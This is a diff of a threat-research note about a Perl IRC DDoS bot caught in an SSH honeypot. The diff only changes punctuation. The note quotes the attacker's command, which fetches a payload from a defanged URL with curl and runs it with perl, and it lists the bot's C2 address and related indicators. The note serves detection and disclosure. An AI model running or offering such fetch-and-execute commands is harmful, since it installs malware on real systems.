@@ -1,6 +1,6 @@
 # PerlBot "Dred": a PBot-derived IRC DDoS bot and its C2
 
-**KSI Digital threat research · 2026-10-05 · observed 2026-10-03**
+**KSI Digital threat research | 2026-10-05 | observed 2026-10-03**
 
 A Perl IRC flood bot landed in our Cowrie SSH honeypot. The sample and its download URL were already on public feeds, but
 its **hard-coded IRC C2 was not**. We reported the C2; this note records the full profile.
@@ -9,7 +9,7 @@ Indicators: [`iocs.csv`](iocs.csv).
 
 ## Observation
 
-On 2026-10-03 (09:47–09:53 UTC) an actor logged in to the SSH honeypot as root and ran, nine times:
+On 2026-10-03 (09:47-09:53 UTC) an actor logged in to the SSH honeypot as root and ran, nine times:
 
 ```
 uname -a; lspci | grep -i vga ...; curl -s -L hxxp://192.227.210[.]190/dred -o /tmp/dred; perl /tmp/dred
@@ -34,9 +34,9 @@ The C2 was identified from the sample's configuration only; we did not join the 
 
 | Indicator | Role |
 |---|---|
-| `23.95.235[.]108:6667` | IRC C2 (channel `#new`) → ThreatFox 1948443 (KSI Digital) |
+| `23.95.235[.]108:6667` | IRC C2 (channel `#new`) -> ThreatFox 1948443 (KSI Digital) |
 | `hxxp://192.227.210[.]190/dred` | download URL (URLhaus 3920026) |
-| `a37649842a47b845…` | sample "DDoS Perl IrcBot v2.0" (44,755 B), on MalwareBazaar |
+| `a37649842a47b845...` | sample "DDoS Perl IrcBot v2.0" (44,755 B), on MalwareBazaar |
 
 ## Detection ideas
 
@@ -51,4 +51,4 @@ Ready-to-use rules are in [`detection/`](detection/). The signals they encode:
 ThreatFox: `23.95.235[.]108:6667` (botnet_cc, elf.perlbot; KSI Digital 2026-10-03, id 1948443). Sample and download URL
 were already on MalwareBazaar / URLhaus (credited to their original reporters); the IRC C2 was the gap.
 
-Contact: christophe@ksi-digital.com · abuse.ch `@ksi_digital` · Licensed [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)
+Contact: christophe@ksi-digital.com | abuse.ch `@ksi_digital` | Licensed [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)
